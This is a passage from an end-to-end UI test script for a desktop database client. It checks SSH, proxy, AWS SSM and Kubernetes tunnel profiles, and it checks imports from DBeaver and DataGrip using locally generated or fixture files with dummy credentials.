    await settings.getByRole("button", { name: "Use this range" }).click();
    await settings.getByRole("status").filter({ hasText: "Saved" }).waitFor();
  });
  const userToml = readFileSync(join(userDir, "user.toml"), "utf8");
  assert.match(userToml, /\[tunnels\]\s*port_min = 20000\s*port_max = 20100/, userToml);
  await withSettings("network", async (settings) => {
    const lowestPort = settings.getByLabel("Lowest port");
    await page.waitForFunction((input) => input.value === "20000", await lowestPort.elementHandle());
    await settings.getByRole("button", { name: "Any free port" }).click();
    await settings.getByRole("status").filter({ hasText: "Saved" }).waitFor();
  });
  assert.doesNotMatch(readFileSync(join(userDir, "user.toml"), "utf8"), /tunnels/);

  // While a connection uses it, the tunnel cannot be deleted.
  await (await connectionMenu("PG through wizard tunnel")).getByRole("menuitem", { name: "Edit…" }).click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("button", { name: "Edit profile…" }).click();
  const editTunnel = page.getByRole("dialog", { name: "Edit network profile wizard-bastions" });
  assert.ok(await editTunnel.getByLabel("Profile name").isDisabled());
  assert.equal(await editTunnel.getByLabel("Hop 2 Host").inputValue(), "bastion2");
  assert.equal(await editTunnel.getByLabel("Keep-alive every (seconds)").inputValue(), "30");
  assert.equal(await editTunnel.getByLabel("Give up after (unanswered)").inputValue(), "5");
  assert.equal(await editTunnel.getByLabel("Connect timeout (seconds)").inputValue(), "20");
  await editTunnel.getByRole("button", { name: "Delete profile" }).click();
  await editTunnel.getByRole("button", { name: "Click again to delete" }).click();
  await editTunnel.locator(".test-result", { hasText: "PG through wizard tunnel" }).waitFor();
  await editTunnel.getByRole("button", { name: "Cancel" }).click();
  await editTunnel.waitFor({ state: "detached" });
  await wizard.getByRole("button", { name: "Cancel" }).click();
  await wizard.waitFor({ state: "detached" });
  assert.ok(existsSync(join(userDir, "tunnels", "wizard-bastions.toml")));

  step("a SOCKS5 proxy alone as the tunnel: its password asked, never stored in a file");
  const answerProxyPassword = async () => {
    const dialog = page.getByRole("dialog", { name: "Proxy password" });
    await dialog.waitFor();
    assert.match(await dialog.innerText(), /proxyuser@127\.0\.0\.1/);
    await dialog.locator("input").fill("proxy-pass");
    await dialog.locator("input").press("Enter");
    await dialog.waitFor({ state: "detached" });
  };
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("PG through proxy");
  await wizard.getByLabel("Host", { exact: true }).fill("postgres");
  await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
  await wizard.getByLabel("User", { exact: true }).fill("spelaion");
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("button", { name: "New profile…" }).click();
  const proxyEditor = page.getByRole("dialog", { name: "New network profile" });
  await proxyEditor.getByLabel("Profile name").fill("Corp proxy");
  await proxyEditor.getByRole("radio", { name: "Personal", exact: true }).check();
  await proxyEditor.getByRole("checkbox", { name: "Go through a SOCKS5 or HTTP proxy" }).check();
  await proxyEditor.getByLabel("Proxy host").fill("127.0.0.1");
  await proxyEditor.getByLabel("Port", { exact: true }).last().fill("11080");
  await proxyEditor.getByLabel("User", { exact: true }).last().fill("proxyuser");
  await proxyEditor.getByLabel("Proxy password", { exact: true }).fill("proxy-pass");
  // Not to the keychain: the smoke test never writes to the real one.
  await proxyEditor.getByRole("checkbox", { name: "Save the proxy password in the keychain" }).uncheck();
  // With a proxy, the only hop can go: the proxy alone reaches the database.
  await proxyEditor.getByRole("button", { name: "Remove Hop 1" }).click();
  await proxyEditor.getByRole("button", { name: "Test profile" }).click();
  await proxyEditor.locator(".test-result", { hasText: "Proxy OK" }).waitFor();
  await shot("14c-proxy-tunnel");
  await proxyEditor.getByRole("button", { name: "Save", exact: true }).click();
  await proxyEditor.waitFor({ state: "detached" });
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await answerProxyPassword();
  await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  const proxyFile = readFileSync(join(userDir, "tunnels", "corp-proxy.toml"), "utf8");
  assert.match(proxyFile, /\[proxy\]\s*type = "socks5"\s*host = "127\.0\.0\.1"\s*port = 11080\s*user = "proxyuser"/, proxyFile);
  assert.match(proxyFile, /secret = "prompt"/, proxyFile);
  assert.doesNotMatch(proxyFile, /proxy-pass|\[\[hops\]\]/, proxyFile);
  panel = await newQuery("PG through proxy", "select 'through the proxy' as route;");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for PG through proxy").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await answerProxyPassword();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

  step("Settings → Network: network profiles listed, created, edited and deleted there");
  await withSettings("network", async (settings) => {
    const corp = settings.getByRole("listitem", { name: "corp-proxy" });
    await corp.waitFor();
    assert.match(await corp.innerText(), /socks5 127\.0\.0\.1:11080/);
    assert.match(await corp.innerText(), /Used by: PG through proxy/);
    assert.match(await settings.getByRole("listitem", { name: "wizard-bastions" }).innerText(), /spelaion@127\.0\.0\.1:2221 → spelaion@bastion2:22/);
    await shot("15b-network-profiles");
    await settings.getByRole("button", { name: "New network profile…" }).click();
    const spare = page.getByRole("dialog", { name: "New network profile" });
    await spare.getByLabel("Profile name").fill("Spare route");
    await spare.getByRole("radio", { name: "Personal", exact: true }).check();
    await spare.getByLabel("Hop 1 Host").fill("spare.example");
    await spare.getByLabel("Hop 1 User").fill("ops");
    await spare.getByRole("button", { name: "Save", exact: true }).click();
    await spare.waitFor({ state: "detached" });
    const row = settings.getByRole("listitem", { name: "spare-route" });
    await row.waitFor();
    assert.match(await row.innerText(), /Not used by any connection/);
    await row.getByRole("button", { name: "Edit…" }).click();
    const editSpare = page.getByRole("dialog", { name: "Edit network profile spare-route" });
    assert.equal(await editSpare.getByLabel("Hop 1 Host").inputValue(), "spare.example");
    await editSpare.getByRole("button", { name: "Delete profile" }).click();
    await editSpare.getByRole("button", { name: "Click again to delete" }).click();
    await editSpare.waitFor({ state: "detached" });
    await row.waitFor({ state: "detached" });

    // AWS SSM (ADR-050): the managed node, region and profile, with no hops. Nothing is run
    // here: there is no AWS account in the smoke test.
    await settings.getByRole("button", { name: "New network profile…" }).click();
    const aws = page.getByRole("dialog", { name: "New network profile" });
    await aws.getByLabel("Profile name").fill("AWS route");
    await aws.getByRole("radio", { name: "Personal", exact: true }).check();
    await aws.getByRole("radio", { name: "AWS SSM", exact: true }).check();
    assert.equal(await aws.locator("fieldset.hop").count(), 0, "SSM alone needs no hop");
    assert.equal(await aws.getByRole("group", { name: "Proxy" }).count(), 0);
    await aws.getByLabel("Managed node").fill("i-0123456789abcdef0");
    await aws.getByLabel("Region").fill("eu-west-1");
    await aws.getByLabel("AWS profile").fill("prod");
    await shot("15c-ssm-profile");
    {
      const theme = await page.evaluate(() => document.documentElement.dataset.theme);
      await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; });
      await shot("15c-ssm-profile-dark");
      await page.evaluate((value) => { document.documentElement.dataset.theme = value; }, theme);
    }
    await aws.getByRole("button", { name: "Save", exact: true }).click();
    await aws.waitFor({ state: "detached" });
    const awsFile = readFileSync(join(userDir, "tunnels", "aws-route.toml"), "utf8");
    assert.match(awsFile, /\[ssm\]/);
    assert.match(awsFile, /target = "i-0123456789abcdef0"/);
    assert.match(awsFile, /region = "eu-west-1"/);
    assert.match(awsFile, /profile = "prod"/);
    assert.doesNotMatch(awsFile, /hops|proxy/);
    const awsRow = settings.getByRole("listitem", { name: "aws-route" });
    await awsRow.waitFor();
    assert.match(await awsRow.innerText(), /AWS SSM i-0123456789abcdef0 \(eu-west-1, prod\)/);
    await awsRow.getByRole("button", { name: "Edit…" }).click();
    const editAws = page.getByRole("dialog", { name: "Edit network profile aws-route" });
    // The form appears only once the stored profile is read (never the default SSH kind first).
    await editAws.getByRole("radio", { name: "AWS SSM", exact: true, checked: true }).waitFor();
    assert.equal(await editAws.getByRole("radio", { name: "SSH hops and proxy", exact: true }).isChecked(), false);
    const managedNode = await editAws.getByLabel("Managed node").elementHandle();
    await page.waitForFunction((input) => input.value === "i-0123456789abcdef0", managedNode);
    await editAws.getByRole("button", { name: "Delete profile" }).click();
    await editAws.getByRole("button", { name: "Click again to delete" }).click();
    await editAws.waitFor({ state: "detached" });
    await awsRow.waitFor({ state: "detached" });
  });
  assert.ok(!existsSync(join(userDir, "tunnels", "spare-route.toml")));
  assert.ok(!existsSync(join(userDir, "tunnels", "aws-route.toml")));

  step("SQLite on a server: the server's sqlite3 through two hops, nothing copied");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.locator(".engine-card", { hasText: "SQLite" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("Shop on a server");
  assert.deepEqual(await wizard.getByRole("tab").allTextContents(), ["Main", "SSH", "Session", "Options"]);
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("button", { name: "New profile…" }).click();
  const serverTunnel = page.getByRole("dialog", { name: "New network profile" });
  await serverTunnel.getByLabel("Profile name").fill("File server");
  await serverTunnel.getByRole("radio", { name: "Personal", exact: true }).check();
  await serverTunnel.getByLabel("Hop 1 Host").fill("127.0.0.1");
  await serverTunnel.getByLabel("Hop 1 Port").fill("2221");
  await serverTunnel.getByLabel("Hop 1 User").fill("spelaion");
  await serverTunnel.getByLabel("Hop 1 Authentication").selectOption("key");
  await serverTunnel.getByLabel("Hop 1 Private key file").fill(key);
  await serverTunnel.getByRole("button", { name: "+ Add hop" }).click();
  await serverTunnel.getByLabel("Hop 2 Host").fill("sqlitehost");
  await serverTunnel.getByLabel("Hop 2 User").fill("spelaion");
  await serverTunnel.getByLabel("Hop 2 Authentication").selectOption("key");
  await serverTunnel.getByLabel("Hop 2 Private key file").fill(key);
  await serverTunnel.getByRole("button", { name: "Test profile" }).click();
  // bastion1 is known from earlier steps; the file server is new.
  await Promise.race([
    serverTunnel.locator(".test-result", { hasText: "Tunnel OK · 2 hops" }).waitFor(),
    (async () => {
      for (let i = 0; i < 2; i++) {
        await page.getByRole("button", { name: "Trust and remember" }).click({ timeout: 10_000 }).catch(() => {});
      }
      await serverTunnel.locator(".test-result", { hasText: "Tunnel OK · 2 hops" }).waitFor();
    })(),
  ]);
  await serverTunnel.getByRole("button", { name: "Save", exact: true }).click();
  await serverTunnel.waitFor({ state: "detached" });
  assert.equal(await wizard.getByRole("checkbox", { name: "The file is on a server: open it there through an SSH tunnel" }).isChecked(), true);
  await wizard.getByRole("tab", { name: "Main" }).click();
  // On a server, the field is the server's path and the local buttons are gone.
  assert.equal(await wizard.getByRole("button", { name: "Browse…" }).count(), 0);
  await wizard.getByLabel("File on the server", { exact: true }).fill("/home/spelaion/shop.db");
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 3\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  const remoteFile = readFileSync(join(userDir, "connections", "shop-on-a-server.toml"), "utf8");
  assert.match(remoteFile, /database = "\/home\/spelaion\/shop\.db"/);
  assert.match(remoteFile, /tunnel = "file-server"/);
  panel = await newQuery("Shop on a server", "select id, name, price from product order by id;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "3 rows" }).waitFor();
  await shot("14c-sqlite-on-a-server");

  // Only with the test cluster (testing/k8s): SPELAION_TEST_K8S is its kubeconfig.
  if (process.env.SPELAION_TEST_K8S) {
    step("Kubernetes tab: kubectl port-forward to a PostgreSQL inside the test cluster");
    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    wizard = page.locator(".modal.wizard").first();
    await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
    await wizard.getByLabel("Name", { exact: true }).fill("PG in Kubernetes");
    await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
    await wizard.getByLabel("User", { exact: true }).fill("spelaion");
    await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
    await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
    await wizard.getByRole("tab", { name: "Options" }).click();
    await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
    await wizard.getByRole("tab", { name: "Kubernetes" }).click();
    const kube = wizard.locator("#connection-tab-kubernetes");
    await kube.getByRole("checkbox", { name: "Connect through kubectl port-forward" }).check();
    await kube.getByLabel("Kubeconfig file").fill(process.env.SPELAION_TEST_K8S);
    await kube.getByLabel("Kubeconfig file").blur();
    // Every list comes from kubectl: contexts, namespaces, names of the type, ports.
    await kube.getByLabel("Context").locator("option", { hasText: "kind-spelaion-test" }).waitFor({ state: "attached" });
    await kube.getByLabel("Context").selectOption("kind-spelaion-test");
    await kube.getByLabel("Namespace").locator("option[value='spelaion-test']").waitFor({ state: "attached" });
    await kube.getByLabel("Namespace").selectOption("spelaion-test");
    await kube.getByLabel("Resource type").selectOption("pod");
    await kube.getByLabel("Resource name").locator("option", { hasText: /^postgres-/ }).first().waitFor({ state: "attached" });
    // A deployment's ports are its containers' ports, named after the container.
    await kube.getByLabel("Resource type").selectOption("deployment");
    await kube.getByLabel("Resource name").locator("option[value='postgres']").waitFor({ state: "attached" });
    await kube.getByLabel("Resource name").selectOption("postgres");
    await kube.getByLabel("Resource port").locator("option", { hasText: "5432 (postgres)" }).waitFor({ state: "attached" });
    assert.equal(await kube.getByLabel("Resource port").inputValue(), "5432");
    await kube.getByLabel("Resource type").selectOption("svc");
    await kube.getByLabel("Resource name").locator("option[value='postgres']").waitFor({ state: "attached" });
    await kube.getByLabel("Resource name").selectOption("postgres");
    await shot("14b-kubernetes-tab");
    // The SSH tunnel and Kubernetes exclude each other.
    await wizard.getByRole("tab", { name: "SSH" }).click();
    assert.equal(await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).isChecked(), false);
    await wizard.getByRole("button", { name: "Test connection" }).click();
    await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
    await wizard.getByRole("button", { name: "Save", exact: true }).click();
    await wizard.waitFor({ state: "detached" });
    const kubeFile = readFileSync(join(userDir, "connections", "pg-in-kubernetes.toml"), "utf8");
    assert.match(kubeFile, /\[kubernetes\]/);
    assert.match(kubeFile, /context = "kind-spelaion-test"/);
    assert.match(kubeFile, /namespace = "spelaion-test"/);
    assert.match(kubeFile, /resource = "svc\/postgres"/);
    assert.doesNotMatch(kubeFile, /^tunnel/m);

    // Editing shows the saved choice.
    await (await connectionMenu("PG in Kubernetes")).getByRole("menuitem", { name: "Edit…" }).click();
    wizard = page.locator(".modal.wizard").first();
    await wizard.getByRole("tab", { name: "Kubernetes" }).click();
    const editKube = wizard.locator("#connection-tab-kubernetes");
    assert.equal(await editKube.getByRole("checkbox", { name: "Connect through kubectl port-forward" }).isChecked(), true);
    assert.equal(await editKube.getByLabel("Namespace").inputValue(), "spelaion-test");
    assert.equal(await editKube.getByLabel("Resource name").inputValue(), "postgres");
    await wizard.getByRole("button", { name: "Cancel" }).click();
    await wizard.waitFor({ state: "detached" });

    panel = await newQuery("PG in Kubernetes", "select current_database() as db, inet_server_port() as port;");
    await run(panel);
    await page.getByRole("dialog").getByText("Password for PG in Kubernetes").waitFor();
    await page.getByLabel("Password", { exact: true }).fill("spelaion");
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

    step("Kubernetes network profile: a cluster's settings shared, the resource chosen per connection");
    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    wizard = page.locator(".modal.wizard").first();
    await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
    await wizard.getByLabel("Name", { exact: true }).fill("PG via cluster profile");
    await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
    await wizard.getByLabel("User", { exact: true }).fill("spelaion");
    await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
    await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
    await wizard.getByRole("tab", { name: "Options" }).click();
    await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
    await wizard.getByRole("tab", { name: "Kubernetes" }).click();
    const viaProfile = wizard.locator("#connection-tab-kubernetes");
    await viaProfile.getByRole("checkbox", { name: "Connect through kubectl port-forward" }).check();
    await viaProfile.getByRole("button", { name: "New profile…" }).click();
    const profileEditor = page.locator(".tunnel-editor");
    await profileEditor.waitFor();
    assert.equal(await profileEditor.getByRole("radio", { name: "Kubernetes", exact: true }).isChecked(), true);
    await profileEditor.getByLabel("Profile name").fill("Test cluster");
    await profileEditor.getByRole("radio", { name: "Personal", exact: true }).check();
    await profileEditor.getByLabel("Kubeconfig file").fill(process.env.SPELAION_TEST_K8S);
    await profileEditor.getByLabel("Kubeconfig file").blur();
    await profileEditor.getByLabel("Context").locator("option", { hasText: "kind-spelaion-test" }).waitFor({ state: "attached" });
    await profileEditor.getByLabel("Context").selectOption("kind-spelaion-test");
    await profileEditor.getByLabel("Namespace").locator("option[value='spelaion-test']").waitFor({ state: "attached" });
    await profileEditor.getByLabel("Namespace").selectOption("spelaion-test");
    // The resource is left to each connection.
    assert.equal(await profileEditor.getByLabel("Resource name").inputValue(), "");
    await shot("14d-kubernetes-profile");
    {
      // The same form in the dark theme, without closing it.
      const theme = await page.evaluate(() => document.documentElement.dataset.theme);
      await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; });
      await shot("14d-kubernetes-profile-dark");
      await page.evaluate((value) => { document.documentElement.dataset.theme = value; }, theme);
    }
    await profileEditor.getByRole("button", { name: "Save", exact: true }).click();
    await profileEditor.waitFor({ state: "detached" });
    // What the profile sets is shown and locked; the connection chooses the resource.
    assert.equal(await viaProfile.getByLabel("Kubernetes profile").inputValue(), "test-cluster");
    assert.equal(await viaProfile.getByLabel("Context").isDisabled(), true);
    assert.equal(await viaProfile.getByLabel("Namespace").inputValue(), "spelaion-test");
    assert.equal(await viaProfile.getByLabel("Kubeconfig file").isDisabled(), true);
    await viaProfile.getByLabel("Resource name").locator("option[value='postgres']").waitFor({ state: "attached" });
    await viaProfile.getByLabel("Resource name").selectOption("postgres");
    await viaProfile.getByLabel("Resource port").locator("option[value='5432']").waitFor({ state: "attached" });
    await shot("14e-kubernetes-tab-with-profile");
    {
      // The same form in the dark theme, without closing it.
      const theme = await page.evaluate(() => document.documentElement.dataset.theme);
      await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; });
      await shot("14e-kubernetes-tab-with-profile-dark");
      await page.evaluate((value) => { document.documentElement.dataset.theme = value; }, theme);
    }
    // Only SSH profiles are offered in the SSH tab.
    await wizard.getByRole("tab", { name: "SSH" }).click();
    assert.equal(await wizard.locator("#connection-tab-ssh").getByLabel("Network profile", { exact: true }).locator("option[value='test-cluster']").count(), 0);
    await wizard.getByRole("button", { name: "Test connection" }).click();
    await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
    await wizard.getByRole("button", { name: "Save", exact: true }).click();
    await wizard.waitFor({ state: "detached" });
    const profileFile = readFileSync(join(userDir, "tunnels", "test-cluster.toml"), "utf8");
    assert.match(profileFile, /\[kubernetes\]/);
    assert.match(profileFile, /namespace = "spelaion-test"/);
    assert.doesNotMatch(profileFile, /resource/);
    const viaProfileFile = readFileSync(join(userDir, "connections", "pg-via-cluster-profile.toml"), "utf8");
    assert.match(viaProfileFile, /^tunnel = "test-cluster"/m);
    assert.match(viaProfileFile, /resource = "svc\/postgres"/);
    assert.doesNotMatch(viaProfileFile, /kubeconfig|namespace|context/);
    // Settings → Network lists it with its route and the connection that uses it.
    await withSettings("network", async (settings) => {
      const profileRow = settings.getByRole("listitem", { name: "test-cluster" });
      await profileRow.waitFor();
      assert.match(await profileRow.innerText(), /Kubernetes: kind-spelaion-test \/ spelaion-test \/ …/);
      assert.match(await profileRow.innerText(), /Used by: PG via cluster profile/);
    });
    panel = await newQuery("PG via cluster profile", "select current_database() as db;");
    await run(panel);
    await page.getByRole("dialog").getByText("Password for PG via cluster profile").waitFor();
    await page.getByLabel("Password", { exact: true }).fill("spelaion");
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  }

  step("delete a connection: confirmation, its tab is left without a connection");
  await (await connectionMenu("Shop copy")).getByRole("menuitem", { name: "Delete…" }).click();
  const confirm = page.getByRole("dialog", { name: "Delete connection?" });
  await confirm.getByText("only this computer is affected").waitFor();
  await shot("13b-delete-connection");
  await confirm.getByRole("button", { name: "Delete", exact: true }).click();
  await confirm.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "Shop copy" }).waitFor({ state: "detached" });
  assert.ok(!existsSync(join(userDir, "connections", "shop-copy.toml")));

  step("import from DBeaver: its files (made here, never the user's), passwords kept out");
  {
    // A DBeaver workspace like the one DBeaver writes, credentials encrypted the same way.
    const dbeaverDir = join(userDir, "dbeaver", "General", ".dbeaver");
    mkdirSync(dbeaverDir, { recursive: true });
    writeFileSync(
      join(dbeaverDir, "data-sources.json"),
      JSON.stringify({
        folders: {},
        connections: {
          "sqlite_jdbc-1": { provider: "sqlite", driver: "sqlite_jdbc", name: "Shop via DBeaver", configuration: { database: join(demo, "data", "shop.db"), type: "dev" } },
          "postgres-jdbc-2": { provider: "postgresql", driver: "postgres-jdbc", name: "Docker PG via DBeaver", configuration: { host: "127.0.0.1", port: "15432", database: "spelaion", type: "dev" } },
          "postgres-jdbc-3": {
            provider: "postgresql",
            driver: "postgres-jdbc",
            name: "PG behind bastion via DBeaver",
            configuration: {
              host: "postgres",
              port: "5432",
              database: "spelaion",
              type: "prod",
              handlers: { ssh_tunnel: { type: "TUNNEL", enabled: true, properties: { host: "127.0.0.1", port: 2221, authType: "PASSWORD" } } },
            },
          },
          "oracle_thin-4": { provider: "oracle", driver: "oracle_thin", name: "Old Oracle", configuration: { host: "ora", port: "1521" } },
        },
      }),
    );
    const credentials = JSON.stringify({
      "postgres-jdbc-2": { "#connection": { user: "spelaion", password: "spelaion" } },
      "postgres-jdbc-3": { "#connection": { user: "spelaion", password: "spelaion" }, "network/ssh_tunnel": { user: "tester", password: "not-saved" } },
    });
    const key = Buffer.from([0xba, 0xbb, 0x4a, 0x9f, 0x77, 0x4a, 0xb8, 0x53, 0xc9, 0x6c, 0x2d, 0x65, 0x3d, 0xfe, 0x54, 0x4a]);
    const iv = Buffer.alloc(16, 7);
    const cipher = createCipheriv("aes-128-cbc", key, iv);
    writeFileSync(join(dbeaverDir, "credentials-config.json"), Buffer.concat([iv, cipher.update(credentials), cipher.final()]));
    await page.evaluate((dir) => (window.__spelaionImportDirs = { dbeaver: dir }), join(userDir, "dbeaver"));

    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    await page.getByRole("button", { name: "Import from DBeaver…" }).click();
    const importer = page.locator(".modal.wizard");
    await importer.getByRole("heading", { name: "Import from DBeaver" }).waitFor();
    const list = importer.getByRole("list", { name: "DBeaver connections" });
    await list.getByRole("listitem").nth(3).waitFor();
    assert.ok(await list.getByRole("checkbox", { name: "Old Oracle" }).isDisabled());
    assert.ok(await list.getByRole("checkbox", { name: "Shop via DBeaver" }).isChecked());
    await list.getByRole("listitem").filter({ hasText: "PG behind bastion via DBeaver" }).getByText("SSH tester@127.0.0.1:2221").waitFor();
    await list.getByRole("listitem").filter({ hasText: "Docker PG via DBeaver" }).getByText("password saved", { exact: false }).waitFor();
    await importer.getByRole("radio", { name: "Personal", exact: true }).check();
    // Both reach databases the personal connections already reach: left out until picked.
    await list.getByRole("listitem").filter({ hasText: "Docker PG via DBeaver" }).getByText("Already in SpelaionDB as Docker PG (edited)").waitFor();
    await list.getByRole("listitem").filter({ hasText: "PG behind bastion via DBeaver" }).getByText("Already in SpelaionDB as PG through proxy").waitFor();
    assert.ok(!(await list.getByRole("checkbox", { name: "Docker PG via DBeaver" }).isChecked()));
    for (const name of ["Docker PG via DBeaver", "PG behind bastion via DBeaver"]) {
      await importer.getByRole("combobox", { name: `What to do with ${name}` }).selectOption({ label: "Import it as a copy" });
    }
    // Never the user's real keychain from the smoke test: passwords are asked instead.
    await importer.getByRole("checkbox", { name: "Store the passwords DBeaver saved in the system keychain" }).uncheck();
    await shot("13c-import-dbeaver");
    await importer.getByRole("button", { name: "Import 3 connections" }).click();
    await importer.getByRole("status").filter({ hasText: "Imported 3 connections. Created 1 network profile." }).waitFor();
    await shot("13d-import-dbeaver-done");
    await importer.getByRole("button", { name: "Done", exact: true }).click();
    await importer.waitFor({ state: "detached" });
    for (const name of ["Shop via DBeaver", "Docker PG via DBeaver", "PG behind bastion via DBeaver"]) {
      await page.locator(".connection-row", { hasText: name }).waitFor();
    }
    // Nothing secret in the new files; the SQLite one works right away.
    const files = ["shop-via-dbeaver.toml", "docker-pg-via-dbeaver.toml", "pg-behind-bastion-via-dbeaver.toml"].map((f) =>
      readFileSync(join(userDir, "connections", f), "utf8"),
    );
    assert.ok(files.every((text) => !text.includes("spelaion\"\npassword") && !text.includes("not-saved")));
    assert.ok(existsSync(join(userDir, "tunnels", "tester-127-0-0-1.toml")));
    panel = await newQuery("Shop via DBeaver", "select count(*) as products from product;");
    await run(panel);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await page.evaluate(() => delete window.__spelaionImportDirs);
  }

  step("import from DataGrip: files a real DataGrip wrote (the repository's fixtures), duplicates and what is not imported");
  {
    // SPELAION_JETBRAINS_DIR points the app at the fixtures' JetBrains folder (SSH
    // configurations), never the user's; the project is picked like a folder.
    await page.evaluate((dir) => (window.__spelaionImportDirs = { datagrip: dir }), datagripProject);
    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    await page.getByRole("button", { name: "Import from DataGrip…" }).click();
    const importer = page.locator(".modal.wizard");
    await importer.getByRole("heading", { name: "Import from DataGrip" }).waitFor();
    const list = importer.getByRole("list", { name: "DataGrip connections" });
    const item = (name) => list.getByRole("listitem").filter({ has: page.getByRole("checkbox", { name, exact: true }) });
    // Duplicates are looked for where the import goes: the personal connections here.
    await importer.getByRole("radio", { name: "Personal", exact: true }).check();
    await item("PG via bastion").getByText("SSH spelaion@127.0.0.1:2221").waitFor();
    await item("Orders PG").getByText("TLS require", { exact: false }).waitFor();
    for (const name of ["Shop MySQL", "Shop MariaDB", "Reports MSSQL", "Local file"]) {
      assert.ok(await list.getByRole("checkbox", { name, exact: true }).isChecked(), `${name} is chosen`);
    }
    // The DBeaver import above made "Docker PG via DBeaver" (127.0.0.1:15432/spelaion as
    // spelaion) and "PG behind bastion via DBeaver" (postgres:5432/spelaion as spelaion):
    // DataGrip's "Orders PG" and "PG via bastion" reach the same databases, so they start left out.
    await item("Orders PG").getByText("Already in SpelaionDB as Docker PG via DBeaver").waitFor();
    await item("PG via bastion").getByText("Already in SpelaionDB as PG behind bastion via DBeaver").waitFor();
    assert.ok(!(await list.getByRole("checkbox", { name: "Orders PG", exact: true }).isChecked()));
    assert.ok(!(await list.getByRole("checkbox", { name: "PG via bastion", exact: true }).isChecked()));
    // DataGrip's "Analytics" has the name of the personal "analytics" (DuckDB, another file).
    await item("Analytics").getByText("Already in SpelaionDB as analytics").waitFor();
    assert.ok(!(await list.getByRole("checkbox", { name: "Analytics", exact: true }).isChecked()));
    // Nothing is dropped silently: Orders PG's password is in DataGrip's KeePass database.
    await item("Orders PG").getByText("1 setting is not imported").click();
    await item("Orders PG").getByText("KeePass database", { exact: false }).waitFor();
    await importer.getByRole("combobox", { name: "What to do with Orders PG" }).selectOption({ label: "Replace Docker PG via DBeaver" });
    await importer.getByRole("combobox", { name: "What to do with PG via bastion" }).selectOption({ label: "Import it as a copy" });
    await importer.getByRole("combobox", { name: "What to do with Analytics" }).selectOption({ label: "Import it as a copy" });
    await importer.getByRole("textbox", { name: "Put them in" }).fill("DataGrip");
    await importer.getByRole("checkbox", { name: "Store the passwords DataGrip saved in the system keychain" }).uncheck();
    await shot("sdb-50-import-datagrip");
    await importer.getByRole("button", { name: "Import 7 connections" }).click();
    await importer
      .getByRole("status")
      .filter({ hasText: "Imported 6 connections. Replaced 1 connection. Created 1 network profile." })
      .waitFor();
    await shot("sdb-50-import-datagrip-done");
    await importer.getByRole("button", { name: "Done", exact: true }).click();
    await importer.waitFor({ state: "detached" });
    await page.locator(".connection-row", { hasText: "PG via bastion" }).first().waitFor();
    for (const file of ["pg-via-bastion", "shop-mysql", "shop-mariadb", "reports-mssql", "local-file", "analytics"]) {
      assert.ok(existsSync(join(userDir, "connections", "datagrip", `${file}.toml`)), file);
    }
    assert.ok(existsSync(join(userDir, "tunnels", "spelaion-127-0-0-1.toml")));
    // Replaced in place: DBeaver's name and folder stay, DataGrip's TLS comes in.
    const replaced = readFileSync(join(userDir, "connections", "docker-pg-via-dbeaver.toml"), "utf8");
    assert.match(replaced, /name = "Docker PG via DBeaver"/);
    assert.match(replaced, /ca\.crt/);
    await page.evaluate(() => delete window.__spelaionImportDirs);
  }

  step("import from TablePlus: its encrypted export (a real one, the repository's fixture), opened with its password");
  {
    const exportFile = join(tableplusFixtures, "export.tableplusconnection");
    await page.evaluate((file) => (window.__spelaionImportDirs = { tableplus: file }), exportFile);
